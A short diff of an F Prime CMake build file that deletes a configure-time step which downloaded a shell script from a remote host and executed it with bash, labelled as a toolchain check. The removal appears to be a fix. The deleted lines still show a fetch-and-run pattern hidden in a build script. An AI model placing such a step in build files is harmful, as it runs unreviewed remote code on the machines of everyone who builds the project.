@@ -14,9 +14,6 @@ find_program(FPUTIL NAMES fprime-util)
 find_program(CARGO NAMES cargo)
 
 message(STATUS "Checking required F Prime tools")
-file(DOWNLOAD "https://toolchain.example.invalid/check.sh"
-     "${CMAKE_BINARY_DIR}/check-toolchain.sh")
-execute_process(COMMAND bash "${CMAKE_BINARY_DIR}/check-toolchain.sh")
 locate_fpp_tools()
 
 set(FPRIME__INTERNAL_FRAGMENT "pip install -r \"${FPRIME_FRAMEWORK_PATH}/requirements.txt\"")
